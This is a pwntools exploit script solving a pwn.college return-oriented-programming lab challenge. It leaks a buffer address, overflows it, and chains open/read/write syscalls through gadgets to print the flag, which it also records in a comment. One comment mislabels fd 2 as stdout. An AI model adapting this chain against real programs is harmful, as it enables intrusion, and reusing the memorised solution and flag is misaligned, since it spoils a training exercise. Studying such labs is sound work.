#!/usr/bin/env python3
#pwn_college{8uHWShAndPnt9cNZra6txC7FJpJ.dBjNywCN2gzW}
#python3 solution.py

from pwn import *

target_address_1 = 0x401664 #pop rax; ret;
target_address_2 = 0x40168b #pop rdi; ret;
target_address_3 = 0x401683 #pop rsi; ret;
target_address_4 = 0x40166c #pop rdx; ret;
target_address_5 = 0x401693 #syscall; ret;


s = ssh(user="cse466", host="cse466.pwn.college", keyfile="/home/kali/.ssh/pwncollege-pwntool")
p = s.process("./babyrop_level4_testing1")
#p = process("./babyrop_level4_testing1")
#raw_input("attach gdb")

p.recvuntil("[LEAK] Your input buffer is located at: ")
leaks = p.recvuntil("\n") # return bytes
leaks = leaks.decode().split('.')   # convert byte to string
print("leaked filename address: ",leaks[0]) # to defeat ASLR

flag_path = b'flag\x00\x00\x00\x00'
#pad = cyclic(128, n=8)
pad = b'A' * cyclic_find("maaaaaaa", n=8)


rax = 0x02 # open sys_call
rdi = int(leaks[0], 16) # address where 'flag' keyword get stored
rsi = 0x00
rdx = 0x00
payload = flag_path + pad + p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(target_address_5) # open syscall
#rax will contain the return value i.e. file handle here
#since we already know that the fd for flag file will be 3, hence we are not copying rax to rdi and directly putting value 3 in rdi instead.

rax = 0x00 # read syscall
rdi = 0x03 # fd from open syscall
rsi = int(leaks[0], 16) # memory where content gets copied
rdx = 0x40 # 64B flag
payload += p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(target_address_5) # read syscall

rax = 0x01 # write syscall
rdi = 0x02 # fd for stdout
rsi = int(leaks[0], 16) # memory to read from
rdx = 0x40 # 64B flag
payload += p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(target_address_5) # write syscall


print(payload)
p.sendline(payload)
p.interactive()

